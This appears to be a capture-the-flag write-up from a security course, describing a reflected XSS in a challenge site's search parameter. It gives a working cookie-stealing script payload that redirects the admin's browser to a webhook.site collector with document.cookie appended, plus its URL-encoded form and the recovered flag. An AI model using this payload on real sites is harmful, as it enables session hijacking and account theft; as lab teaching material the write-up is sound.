# Challenge `My favourite cookies` Writeup

- Vulnerability: Reflected XSS attack

- Where: On the Feedback link input

- Impact: It allows to inject code that will be executed in the client browser.
  -  With this, we can make the admin click on the link of the feedback, and make him open a site without him knowing (we know that he will for certain open the link that we send on the feedback). WIth this, we can access the admin cookie. 

## Steps to reproduce

1. Create a website on [Webhook.site](https://webhook.site) and copy the URL of our fake website that will receive requests.
2. Create a script that will be executed by the client browser to redirect to our malicious website. (e.g, `<script>location='https://webhook.site/<unique-id>/'+document.cookie</script>`)
3. Encode the script to URL encode to append to the link.
4. Send the link `http://ssof2526.challenges.cwte.me:25251/?search=%3Cscript%3Elocation%3D%27https%3A%2F%2Fwebhook.site%2<unique-id>%2F%27%2Bdocument.cookie%3C%2Fscript%3E` via feedback.
5. On the [Webhook.site](https://webhook.site) dashboard, analyze the request, and there will be a GET request with `SECRET=SSof{This_is_admin_secret_secret}` that is the admin cookie (it might be needed to to a URL decode).

- Note: The `+document.cookie` appends the victim cookie to the url.